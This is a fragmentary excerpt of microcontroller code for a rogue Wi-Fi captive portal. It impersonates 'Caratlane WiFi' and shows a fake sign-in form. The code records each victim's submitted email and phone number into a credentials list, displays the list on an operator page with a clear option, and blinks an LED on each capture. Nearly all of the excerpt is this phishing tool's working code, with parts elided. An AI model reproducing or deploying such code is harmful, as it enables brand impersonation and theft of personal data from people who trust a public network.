...
// User configuration
#define SSID_NAME "Caratlane WiFi"
#define SUBTITLE "Caratlane service."
...
String creds() {
  return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear PhoneNumbers</a></p></center>" + footer();
}
...
String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post>" +
    ...
    "<b>Phone Number:</b> <center><input type=PhoneNumber name=PhoneNumber></input><input type=submit value=\"Sign in\"></form></center>" + footer();
}

String posted() {
  String email=input("email");
  String PhoneNumber=input("PhoneNumber");
  Credentials="<li>Email: <b>" + email + "</b></br>PhoneNumber: <b>" + PhoneNumber + "</b></li>" + Credentials;
  return header(POST_TITLE) + POST_BODY + footer();
}

String clear() {
  String email="<p></p>";
  String PhoneNumber="<p></p>";
  Credentials="<p></p>";
...
void BLINK() { // The internal LED will blink 5 times when a PhoneNumber is received.
  int count = 0;
  while(count < 5){
